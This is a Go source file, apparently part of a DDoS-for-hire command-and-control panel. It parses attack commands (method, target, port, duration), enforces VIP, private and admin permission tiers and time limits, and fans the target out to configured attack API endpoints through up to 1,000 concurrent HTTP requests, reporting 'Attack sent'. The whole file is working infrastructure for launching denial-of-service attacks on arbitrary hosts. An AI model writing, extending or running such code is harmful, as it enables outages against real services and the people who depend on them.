package managers

import (
	"arismcnc/database"
	"arismcnc/utils"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"sync"
	"time"
)

type AttackTelegram struct {
	Target     string
	Port       string
	Duration   uint32
	MethodName string
	Username   string
	API        []string
}

func NewAttackTelegram(username string, args []string, vip, private, admin bool, maxtime int, db *database.Database) (*AttackTelegram, error) {
	if len(args) < 4 {
		return nil, errors.New("invalid attack format")
	}

	methodName := args[0]
	target := args[1]
	port := args[2]
	durationStr := args[3]

	// Get method config
	method, err := utils.GetMethod(methodName)
	if err != nil {
		return nil, fmt.Errorf("method '%s' not found", methodName)
	}

	// Check permissions
	if utils.HasVipPermission(method.Method) && !vip {
		return nil, errors.New("VIP permission required for this method")
	}
	if utils.HasPrivatePermission(method.Method) && !private {
		return nil, errors.New("Private permission required for this method")
	}
	if utils.HasAdminPermission(method.Method) && !admin {
		return nil, errors.New("Admin permission required for this method")
	}

	// Parse duration
	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		return nil, errors.New("invalid duration format")
	}

	if duration <= 0 {
		return nil, errors.New("duration must be positive")
	}

	// Check method limits
	if uint32(duration) < method.MinTime {
		return nil, fmt.Errorf("minimum duration for this method is %d seconds", method.MinTime)
	}

	if uint32(duration) > method.MaxTime {
		return nil, fmt.Errorf("maximum duration for this method is %d seconds", method.MaxTime)
	}

	// Check user limit
	if !admin && duration > maxtime {
		return nil, fmt.Errorf("your maximum allowed duration is %d seconds", maxtime)
	}

	return &AttackTelegram{
		Target:     target,
		Port:       port,
		Duration:   uint32(duration),
		MethodName: methodName,
		Username:   username,
		API:        method.API,
	}, nil
}

func (a *AttackTelegram) BuildTelegram(db *database.Database) (bool, error, string) {
	apiList := a.API
	apiLen := len(apiList)

	if apiLen == 0 {
		return true, errors.New("no API endpoints configured for this method"), ""
	}

	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 1000,
			IdleConnTimeout:     30 * time.Second,
		},
		Timeout: 2 * time.Second,
	}

	var wg sync.WaitGroup
	concurrencyLimit := 1000
	sem := make(chan struct{}, concurrencyLimit)

	for _, apiLink := range apiList {
		finalLink := replacePlaceholders(apiLink, a.Target, a.Port, a.Duration)

		wg.Add(1)
		go func(link string) {
			defer wg.Done()

			sem <- struct{}{}
			defer func() { <-sem }()

			res, err := client.Get(link)
			if err != nil {
				return
			}
			defer res.Body.Close()

			io.Copy(io.Discard, res.Body)
		}(finalLink)
	}

	wg.Wait()

	successMsg := fmt.Sprintf("Attack sent to %s:%s for %d seconds using %s",
		a.Target, a.Port, a.Duration, a.MethodName)

	return false, nil, successMsg
}
